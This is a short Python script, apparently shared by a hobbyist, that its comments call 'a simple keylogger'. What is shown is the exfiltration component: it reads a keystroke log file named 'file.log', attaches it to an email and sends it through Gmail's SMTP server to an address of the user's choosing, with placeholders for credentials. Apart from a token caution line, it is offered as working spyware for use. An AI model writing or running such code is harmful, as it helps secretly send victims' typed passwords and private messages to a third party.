#a simple keylogger for python by Sirius-Black4
#you need the smtplib for this to work
#do not use it if your upto no good
#check my Youtube video for more information on how to get it running


import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

#put your gmail id, password, sender address over here

email_user = 'fill_your_email_adress'
email_password = 'fill_your_email_password'
email_send = 'fill_in_the_email_address_you_are_sending_this_to'
#put any subject you like
subject = 'whatever_you_want_the_subject_to_be'

#fill in the body of the email

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject
#put any body you like
body = 'whatever_you_want_the_body_of_the_email_to_be'
msg.attach(MIMEText(body,'plain'))

#do not change the file name for the keylogger to work

#do not change anything from here to bottom

filename='file.log'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user,email_password)


server.sendmail(email_user,email_send,text)
server.quit()

